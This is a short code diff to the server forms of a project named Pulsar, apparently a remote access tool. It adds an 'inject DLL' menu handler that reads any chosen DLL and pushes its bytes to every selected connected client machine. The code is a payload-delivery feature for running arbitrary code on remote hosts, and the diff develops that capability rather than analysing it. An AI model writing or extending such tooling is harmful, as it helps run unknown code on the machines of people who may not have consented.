@@ -5371,6 +5371,28 @@ namespace Pulsar.Server.Forms
             }
 
         }
+
+        private void injectDLLToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Multiselect = false;
+                ofd.Filter = "DLL Files (*.dll)|*.dll|All Files (*.*)|*.*";
+
+                if (ofd.ShowDialog() != DialogResult.OK)
+                    return;
+
+                string filePath = ofd.FileName;
+                string fileName = Path.GetFileName(filePath);
+                byte[] fileData = File.ReadAllBytes(filePath);
+
+                foreach (Client c in GetSelectedClients())
+                {
+                    c.Send(new DoSendBinFile(fileName, fileData));
+                }
+            }
+
+        }
     }
 
     public class NotificationEntry
